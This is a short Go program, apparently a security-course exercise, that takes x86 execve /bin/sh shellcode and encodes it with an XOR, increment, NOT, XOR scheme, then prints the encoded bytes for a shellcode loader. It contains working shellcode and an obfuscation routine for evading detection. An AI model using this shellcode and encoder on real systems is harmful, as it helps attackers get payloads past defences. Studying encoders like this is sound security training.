/*
Tool:				Custom Encoder
Encoding Scheme:		XOR with 0xaa -> Increment by 1 -> NOT -> XOR with 0xaa
Author:				Mohit Suyal (@mosunit)
Student ID:			PA-16521
Blog:				https://mosunit.com
*/

package main

import (
	"fmt"
)

func main() {

	// exeve_sh shellcode - spawns shell(/bin/sh) on localhost
	Shellcode := []byte{0x31, 0xc0, 0x50, 0x68, 0x6e, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x2f, 0x62, 0x69, 0x89, 0xe3, 0x50, 0x89, 0xe2, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80}

	// key for XOR operation
	var key byte = 0xaa

	// create a slice to store encoded shellcode
	EncodedShellcode := make([]byte, 25)

	// encode operation
	for i := range Shellcode {

		XorFirst := Shellcode[i] ^ key
		Increment := XorFirst + 1
		Not := ^Increment
		XorSecond := Not ^ key
		EncodedShellcode[i] = XorSecond
	}

	// format the encoded code - to be included in shellcode program
	for i := range EncodedShellcode {
		// check the index value to match the last element of the slice
		// this if statement is true for all index values except the last
		if i != len(EncodedShellcode)-1 {
			// Check if the hex coversion of slice element will be less than 2 digits; append an additional "0", if true
			if EncodedShellcode[i] < 16 {
				fmt.Printf("0x0%x,", EncodedShellcode[i])
			} else {
				fmt.Printf("0x%x,", EncodedShellcode[i])
			}
		} else {
			if EncodedShellcode[i] < 16 {
				fmt.Printf("0x0%x", EncodedShellcode[i])
			} else {
				fmt.Printf("0x%x", EncodedShellcode[i])
			}
		}
	}
}
